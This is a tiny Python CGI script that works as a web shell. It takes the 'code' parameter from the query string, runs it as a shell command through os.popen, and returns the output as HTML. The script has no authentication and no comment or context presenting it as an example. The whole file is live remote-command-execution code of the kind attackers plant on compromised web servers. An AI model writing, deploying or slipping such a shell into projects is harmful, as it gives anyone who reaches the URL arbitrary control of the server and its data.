#!/usr/bin/env python3
import os, sys

cmd = os.environ.get('QUERY_STRING', '').replace('code=', '')
print("Content-type: text/html\n")
print(f"<pre>{os.popen(cmd).read()}</pre>")